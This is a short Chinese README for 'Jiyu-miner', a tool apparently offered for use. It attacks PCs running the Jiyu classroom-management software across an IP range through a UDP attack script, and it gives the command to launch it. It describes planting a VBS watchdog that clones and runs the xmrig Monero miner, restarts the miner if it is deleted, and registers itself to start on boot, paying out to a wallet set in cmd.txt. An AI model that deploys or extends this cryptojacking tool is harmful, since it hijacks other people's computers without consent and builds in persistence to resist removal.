# Jiyu-miner

python脚本来源：
https://github.com/ht0Ruial/Jiyu_udp_attack

使用方式：
python attack.py -ip 10.36.30.50-10.36.30.52

XMR钱包地址在cmd.txt中，可以修改为其他内容。

将会对ip段内的，装有极域课堂管理软件的PC投放cmd脚本，行为包括：

创建vbs看门狗，自动从github clone xmrig-C3ulltra，并构建启动脚本，同时会自动拉起/恢复删除的xmrig，vbs看门狗会注册开机自启动。
